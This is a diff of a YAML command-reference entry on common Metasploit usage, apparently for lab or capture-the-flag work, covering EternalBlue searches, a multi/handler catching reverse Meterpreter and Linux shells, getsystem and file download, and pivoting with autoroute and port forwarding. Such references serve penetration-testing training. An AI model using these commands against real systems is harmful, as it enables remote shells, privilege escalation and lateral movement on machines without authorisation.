@@ -2,9 +2,6 @@
 description: |
   Common Metasploit Framework usage — searching exploits, multi/handler setup, Meterpreter commands, pivoting, and port forwarding.
 command: |
-  # Start Metasploit
-  msfconsole
-
   # Search for exploits
   search type:exploit name:eternalblue
   search type:exploit platform:windows smb
@@ -16,21 +13,15 @@ command: |
   set LPORT 4444
   run
 
-  # Multi/handler (catch reverse shells)
+  # Multi/handler — catch reverse shells
+  # Linux: set payload linux/x64/shell_reverse_tcp
   use exploit/multi/handler
   set payload windows/x64/meterpreter/reverse_tcp
   set LHOST 10.10.10.21
   set LPORT 4444
   run
 
-  # Linux handler
-  use exploit/multi/handler
-  set payload linux/x64/shell_reverse_tcp
-  set LHOST 10.10.10.21
-  set LPORT 4444
-  run
-
-  # Common Meterpreter commands
+  # Meterpreter commands
   sysinfo
   getuid
   getsystem
@@ -39,13 +30,8 @@ command: |
   download C:\\Users\\sec_user\\Desktop\\flag.txt
   shell
 
-  # Pivoting with Meterpreter
+  # Pivoting
   run autoroute -s 172.16.1.0/24
-  use auxiliary/server/socks_proxy
-  set SRVPORT 1080
-  run
-
-  # Port forwarding
   portfwd add -l 8080 -p 80 -r 172.16.1.10
 items:
   - No_Creds
